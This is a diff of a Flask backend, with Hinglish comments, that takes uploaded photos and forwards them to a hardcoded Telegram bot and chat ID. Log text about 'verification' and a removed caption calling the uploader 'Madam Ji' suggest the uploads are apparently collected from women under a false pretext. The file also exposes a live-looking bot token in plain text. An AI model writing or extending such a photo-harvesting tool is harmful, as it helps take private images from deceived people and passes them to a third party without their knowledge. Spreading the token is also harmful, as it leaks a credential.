@@ -1,102 +1,50 @@
-import requests
-from flask import Flask, jsonify, render_template, request
+from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
+import requests
+import os
 
 app = Flask(__name__)
 CORS(app)
 
-BOT_TOKEN = "8903839809:AAGFAtDI4HVNwxd4IzCH4WAhY12FY73BvA0"
-CHAT_ID = "8036623116"
+# Aapke screenshots se exact credentials daal diye hain
+BOT_TOKEN = "8903839809:AAGFAtDI4HVNwxd4IzCH4WAhY12FY73BvA0"  
+CHAT_ID = "8036623116"      
 
-
-@app.route("/")
+@app.route('/')
 def home():
-    return render_template("index.html")
+    return render_template('index.html')
 
-
-@app.route("/send-photo", methods=["POST"])
+@app.route('/send-photo', methods=['POST'])
 def send_photo():
-    print("--- New Direct Verification Request ---")
+    if 'photo' not in request.files:
+        return jsonify({"success": False, "message": "Photo nahi mili"}), 400
+        
+    file = request.files['photo']
+    if file.filename == '':
+        return jsonify({"success": False, "message": "File select nahi ki"}), 400
 
-    if "photo" not in request.files:
-        return jsonify({"success": False, "message": "No file uploaded"})
-
-    file = request.files["photo"]
-    if file.filename == "":
-        return jsonify({"success": False, "message": "No file selected"})
-
-    filename_lower = file.filename.lower()
-    print(f"Processing Incoming Data Stream: {file.filename}")
-
-    # Pehle default photo format me send karne ka try karenge
-    url_photo = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    files_photo = {"photo": (file.filename, file.stream, file.mimetype)}
-    data = {
-        "chat_id": CHAT_ID,
-        "caption": "❤️ Madam Ji ne apni beautiful photo share ki hai! 😍",
-    }
-
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    
+    # HEIC aur dynamic content type handle karne ke liye headers mapping
+    mime_type = file.mimetype if file.mimetype else 'application/octet-stream'
+    files = {'photo': (file.filename, file.stream, mime_type)}
+    data = {'chat_id': CHAT_ID}
+    
     try:
-        response = requests.post(
-            url_photo, data=data, files=files_photo, timeout=15
-        )
-        res_json = response.json()
-
-        # Agar Telegram successfully normal photo accept kar leta hai
-        if res_json.get("ok"):
-            print("Successfully sent as Standard Photo Preview!")
-            return jsonify(
-                {"success": True, "message": "Photo sent successfully!"}
-            )
-
-        # 🔄 FALLBACK ENGINE: Agar Telegram ne image compression/HEIC bytes ki wajah se reject kiya
-        elif "IMAGE_PROCESS_FAILED" in res_json.get("description", ""):
-            print(
-                "Detected internal image format mismatch. Activating Document Fallback Mode..."
-            )
-
-            # Stream memory pointer reset karna zaroori hai read retry ke liye
-            file.stream.seek(0)
-
-            url_doc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            files_doc = {
-                "document": (file.filename, file.stream, file.mimetype)
-            }
-
-            response_doc = requests.post(
-                url_doc, data=data, files=files_doc, timeout=15
-            )
-            res_doc_json = response_doc.json()
-            print("Fallback API Response:", res_doc_json)
-
-            if res_doc_json.get("ok"):
-                return jsonify(
-                    {
-                        "success": True,
-                        "message": "Photo securely delivered as original file!",
-                    }
-                )
-            else:
-                return jsonify(
-                    {
-                        "success": False,
-                        "message": res_doc_json.get(
-                            "description", "Fallback Transmission Error"
-                        ),
-                    }
-                )
+        # Timeout ko max 120 seconds kar diya hai taaki dusre phone ki heavy files na rukein
+        response = requests.post(url, files=files, data=data, timeout=120)
+        res_data = response.json()
+        
+        if response.status_code == 200 and res_data.get("ok"):
+            return jsonify({"success": True, "message": "Photo sent successfully!"})
         else:
-            return jsonify(
-                {
-                    "success": False,
-                    "message": res_json.get("description", "API Error"),
-                }
-            )
-
+            return jsonify({"success": False, "message": res_data.get("description", "Telegram error")}), 500
+    except requests.exceptions.Timeout:
+        return jsonify({"success": False, "message": "File processing me time lag raha hai. Fir se try karein!"}), 504
     except Exception as e:
-        print("Exception caught inside thread context:", str(e))
-        return jsonify({"success": False, "message": str(e)})
+        return jsonify({"success": False, "message": str(e)}), 500
 
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", debug=True, port=5000)
